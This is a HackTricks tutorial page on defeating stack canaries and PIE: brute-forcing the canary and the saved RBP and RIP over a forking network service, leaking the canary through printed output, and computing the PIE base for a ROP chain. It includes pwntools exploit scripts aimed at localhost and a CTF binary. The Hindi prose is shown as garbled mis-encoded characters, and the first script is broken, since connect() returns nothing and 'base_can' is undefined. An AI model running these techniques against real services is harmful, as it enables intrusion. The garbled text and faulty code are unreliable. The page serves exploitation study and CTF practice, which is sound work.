<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


**рдпрджрд┐ рдЖрдкрдХреЗ рд╕рд╛рдордиреЗ рдПрдХ рдХреИрдирд░реА рдФрд░ PIE (рдкреЛрдЬреАрд╢рди рдЗрдВрдбрд┐рдкреЗрдВрдбреЗрдВрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓) рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдПрдХ рдмрд╛рдЗрдирд░реА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рджреБрд░реНрдЧрдо рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдорд╛рди рдирд╣реАрдВ рдкрд╛рдПрдЧрд╛ рдпрджрд┐ рдпрд╣ рд╕реНрдерд╛рдирд┐рдХ рд░реВрдк рд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рд╕рдордЭрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рдЪрд╛рдиреЗрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдзреНрдпрд╛рди рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдорд╛рди рдХреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИ рдкрд╣рд▓реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред
{% endhint %}

# рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдХрд░реЗрдВ

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреИрдирд░реА рдХреЛ рджреБрд░реНрдЧрдо рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╣реИ рдЬреЛ **рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЪрд╛рдЗрд▓реНрдб рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдлреЛрд░реНрдХ рдХрд░рддрд╛ рд╣реИ** (рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛), рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ, **рд╡рд╣реА рдХреИрдирд░реА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдПрдЧреА**ред

рдлрд┐рд░, рдХреИрдирд░реА рдХреЛ рджреБрд░реНрдЧрдо рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдХреЗрд╡рд▓ **рдЪрд╛рд░ рдЪрд╛рд░ рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛**, рдФрд░ рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдХреИрдирд░реА рдмрд╛рдЗрдЯ рд╕рд╣реА рдерд╛ рдпрд╛ рдЧрд▓рдд рдерд╛ рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдХрд┐ рдХреНрдпрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреНрд░реИрд╢ рд╣реЛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдкрдиреА рдирд┐рдпрдорд┐рдд рдлрд╝реНрд▓реЛ рдХреЛ рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди **8 рдмрд╛рдЗрдЯреНрд╕ рдХреИрдирд░реА (x64)** рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╕рд╣реА рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рдФрд░ рдПрдХ рдмреБрд░рд╛ рдмрд╛рдЗрдЯ рдХреЛ рдЕрд▓рдЧ рдХрд░рддрд╛ рд╣реИ, рдмрд╕ рдпрд╣ рдЬрд╛рдВрдЪрдХрд░ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ (рдЕрдиреНрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ **рдкреНрд░рдпрд╛рд╕ / рдЕрдкреНрд░рдпрд╛рд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):

## рдЙрджрд╛рд╣рд░рдг 1

рдпрд╣ рдЙрджрд╛рд╣рд░рдг 64 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди 32 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЖрд╕рд╛рдиреА рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## рдЙрджрд╛рд╣рд░рдг 2

рдпрд╣ 32 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ 64 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рдкрд╣рд▓реЗ рдЗрдирдкреБрдЯ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╛рдЗрдЯ рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдлрд┐рд░ рдкреЗрд▓реЛрдбред
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# рдкреНрд░рд┐рдВрдЯ рдХреИрдирд░реА

рдХреИрдирд░реА рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ рдЙрд╕реЗ **рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛**ред
рд╕реЛрдЪрд┐рдП рдПрдХ рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдВ рдПрдХ **рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд░рдорд┐рдд** рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ **рдкрдЯреНрдЯреА** рдХреЛ **рдкреЙрдЗрдВрдЯ рдХрд░рддреА рд╣реИ** рдЬреЛ **рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ** рдХреЗ **рд╣рд┐рд╕реНрд╕реЗ** рдХреЛ **рдкреЙрдЗрдВрдЯ рдХрд░рддреА рд╣реИ**ред рд╣рдорд▓рд╛рд╡рд░ рдЬрд╛рдирддрд╛ рд╣реИ рдХрд┐ рдХреИрдирд░реА рдХрд╛ **рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рд╣реИ** (`\x00`) рдФрд░ рдХреИрдирд░реА рдХреЗ рдмрд╛рдХреА рдмрд╛рдЗрдЯреНрд╕ **рд░реИрдВрдбрдо** рд╣реЛрддреЗ рд╣реИрдВред рддрдм рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдХреЛ **рдХреИрдирд░реА рдХреЗ рдкрд╣рд▓реЗ рдмрд╛рдЗрдЯ рддрдХ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддрд╛ рд╣реИ**ред
рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ **рдкреЗрд▓реЛрдб** рдХреЗ рдмреАрдЪ рдореЗрдВ **рдкрдЯреНрдЯреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ **рдХреИрдирд░реА рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧреА** (рдкрд╣рд▓реЗ рдирд▓ рдмрд╛рдЗрдЯ рдХреЛ рдЫреЛрдбрд╝рдХрд░)ред
рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рд╣рдорд▓рд╛рд╡рд░ рдХреИрдирд░реА рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рд╣рдорд▓рд╛ **рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ** (рдПрдХ рд╣реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рддреНрд░ рдореЗрдВ)

рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдмрд╣реБрдд **рд╕реАрдорд┐рдд** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреА **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ **рдХреИрдирд░реА** рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХреЗ** рдФрд░ рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреЗрд▓реЛрдб (рдПрдХ **рд╣реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рддреНрд░** рдореЗрдВ) рдмрдирд╛ рд╕рдХреЗ рдФрд░ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рдХреЛ **рднреЗрдЬ рд╕рдХреЗ**ред
CTF рдЙрджрд╛рд╣рд░рдг: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдкрддрд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдФрд░ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдХреЛрдИ рдкрддрд╛ рдирд╣реАрдВ рд▓реАрдХ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк **рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ** рдЬреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдПрдХ **рдХреИрдирд░реА** рдФрд░ **PIE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ рдЖрдк рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ (x64) рд╕рд╣реЗрдЬреЗ рдЧрдП **RBP** рд╣реЛрдВрдЧреЗ рдФрд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ рд╕рд╣реЗрдЬреЗ рдЧрдП **RIP** рд╣реЛрдВрдЧреЗред

рдмрд╛рдЗрдирд░реА рд╕реЗ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рддрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рд╕рд╣реА рд╣реИ рдпрджрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдпрд╣ рдХреЗрд╡рд▓ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╡рд╣реА **рдлрд╝рдВрдХреНрд╢рди** RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## рдмреЗрд╕ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

PIE рдХреЛ рдкрд░рд╛рд╕реНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЖрд╡рд╢реНрдпрдХ рдкрддреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреА рд╣реЛрдЧреА: **рдЖрд╡рд╢реНрдпрдХ рдкрддреЛрдВ рд╕реЗ рд▓реАрдХ рд╣реБрдП** рдкрддреЛрдВ рд╕реЗ **RBP** рдФрд░ **RIP**ред

**RBP** рд╕реЗ рдЖрдк **рд╕реНрдЯреИрдХ рдореЗрдВ рдЕрдкрдиреЗ рд╢реИрд▓ рдХреЛ рдХрд╣рд╛рдВ рд▓рд┐рдЦ рд░рд╣реЗ рд╣реИрдВ** рдЙрд╕реЗ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЬрд╛рдирдирд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк _"/bin/sh\x00"_ рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ рдХрд╣рд╛рдВ рд▓рд┐рдЦрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рд▓реАрдХ рд╣реБрдП RBP рдХреЗ рдмрд╛рдж рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдбрд╛рд▓рдХрд░ рдЖрдк рдЕрдкрдиреЗ рд╢реИрд▓рдХреЛрдб рдХрд╛ рд╕реНрдерд╛рди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ рдЖрдк рд╢реИрд▓рдХреЛрдб рдФрд░ RBP рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** рд╕реЗ рдЖрдк **PIE рдмрд╛рдЗрдирд░реА рдХрд╛ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕** рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ **рд╡реИрдз ROP рдЪреЗрди рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ред\
рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП рдмрд╕ `objdump -d vunbinary` рдХрд░реЗрдВ рдФрд░ рдбрд┐рд╕рдЕрд╕реЗрдВрдмрд▓ рдХреЗ рдирд╡реАрдирддрдо рдкрддреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (145).png>)

рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕рднреА рдХреЛрдб рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **1 рдмрд╛рдЗрдЯ рдФрд░ рдЖрдзрд╛ рдмрд╛рдЗрдЯ рд╣реА рдЖрд╡рд╢реНрдпрдХ** рд╣реИ, рдлрд┐рд░, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рд╣реЛрдЧрд╛ **рд▓реАрдХ RIP рд▓реЗрдХрд┐рди "000" рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдиреЗ _0x562002970**ecf**_ рд▓реАрдХ рдХрд┐рдпрд╛ рд╣реИ рддреЛ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ _0x562002970**000**_ рд╣реЛрдЧрд╛ред
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ**.

</details>
